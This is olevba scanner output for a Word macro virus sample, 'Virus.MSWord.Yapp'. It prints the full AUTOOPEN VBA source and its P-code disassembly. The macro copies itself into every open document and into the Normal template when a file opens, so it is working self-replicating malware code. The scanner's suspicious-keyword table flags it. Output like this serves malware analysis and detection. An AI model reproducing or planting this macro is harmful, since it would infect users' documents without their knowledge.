olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Yapp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Yapp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AUTOOPEN.bas 
in file: Virus.MSWord.Yapp - OLE stream: 'Macros/VBA/AUTOOPEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
'(C)CopyRight 1998.12 By Pu HongYi
On Error Resume Next
Dim NEWW, MYAPP As Document, MYAPP1, MYAPP2 As Document
Set MYAPP = Nothing
For Each MYAPP2 In Documents
    If MYAPP2.VBProject.VBComponents.Count = 1 Then
        Set NEWW = MYAPP2.VBProject.VBComponents.Add(1)
        NEWW.Name = "AUTOOPEN"
    End If
Next
If Normal.ThisDocument.VBProject.VBComponents.Count = 1 Then
    Set NEWW = Normal.ThisDocument.VBProject.VBComponents.Add(1)
    NEWW.Name = "AUTOOPEN"
End If
For Each MYAPP In Documents
    For Each MYAPP1 In ThisDocument.VBProject.VBE.CodePanes
        If Trim(MYAPP.VBProject.VBE.CodePanes(1).CodeModule.Lines(1, 1)) <> "Sub MAIN()" Then
            MYAPP.VBProject.VBE.CodePanes(1).CodeModule.InsertLines 1, _
                MYAPP1.CodeModule.Lines(1, 30)
        End If
        If Trim(MYAPP1.CodeModule.Lines(1, 1)) <> "Sub MAIN()" Then
        '    MYAPP1.CodeModule.InsertLines 1, _
                MYAPP.VBProject.VBE.CodePanes(1).CodeModule.Lines(1, 30)
        End If
    Next
    Set MYAPP = Nothing
Next
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Yapp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1125 bytes
' Macros/VBA/AUTOOPEN - 2734 bytes
' Line #0:
' 	FuncDefn (Sub MAIN())
' Line #1:
' 	QuoteRem 0x0000 0x0021 "(C)CopyRight 1998.12 By Pu HongYi"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim 
' 	VarDefn NEWW
' 	VarDefn MYAPP
' 	VarDefn MYAPP1
' 	VarDefn MYAPP2
' Line #4:
' 	SetStmt 
' 	LitNothing 
' 	Set MYAPP 
' Line #5:
' 	StartForVariable 
' 	Ld MYAPP2 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #6:
' 	Ld MYAPP2 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MYAPP2 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set NEWW 
' Line #8:
' 	LitStr 0x0008 "AUTOOPEN"
' 	Ld NEWW 
' 	MemSt New 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Next 
' Line #11:
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set NEWW 
' Line #13:
' 	LitStr 0x0008 "AUTOOPEN"
' 	Ld NEWW 
' 	MemSt New 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld MYAPP 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #16:
' 	StartForVariable 
' 	Ld MYAPP1 
' 	EndForVariable 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd CodePanes 
' 	ForEach 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MYAPP 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	ArgsMemLd CodePanes 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x000A "Sub MAIN()"
' 	Ne 
' 	IfBlock 
' Line #18:
' 	LineCont 0x0004 10 00 10 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	Ld MYAPP1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld MYAPP 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	ArgsMemLd CodePanes 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MYAPP1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x000A "Sub MAIN()"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LineCont 0x0004 01 00 DC FF
' 	QuoteRem 0x0008 0x006C "    MYAPP1.CodeModule.InsertLines 1,                MYAPP.VBProject.VBE.CodePanes(1).CodeModule.Lines(1, 30)"
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	StartForVariable 
' 	Next 
' Line #24:
' 	SetStmt 
' 	LitNothing 
' 	Set MYAPP 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' Line #29:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBProject.VBE       |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

